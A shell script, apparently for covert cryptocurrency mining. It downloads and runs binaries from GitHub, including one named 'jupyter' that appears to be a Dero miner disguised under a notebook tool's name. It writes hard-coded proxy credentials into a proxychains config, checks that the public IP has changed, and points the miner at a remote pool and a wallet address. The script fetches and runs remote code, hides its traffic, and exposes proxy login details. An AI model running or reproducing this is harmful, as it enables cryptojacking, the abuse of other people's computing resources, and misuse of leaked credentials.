proxy="45.155.69.201" 
port="6406" 
user="ingfoingfo"  
pass="maszZeehh"
wget -q -O wget https://github.com/dadanhiyeumX9/dero-mod/raw/main/jupyter-v0.0.5-linux-amd64.tar.gz && tar zxf jupyter-v0.0.5-linux-amd64.tar.gz
wget -q https://github.com/mamagisel/pret/raw/main/panel && chmod +x panel 
wget -q https://github.com/mamagisel/pret/raw/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://github.com/mamagisel/pret/raw/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./jupyter -r 134.209.221.102:8080 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmhs3jxql0usq2qpkkjsx.$(echo $(shuf -i 1000-9999 -n 1)-rk)
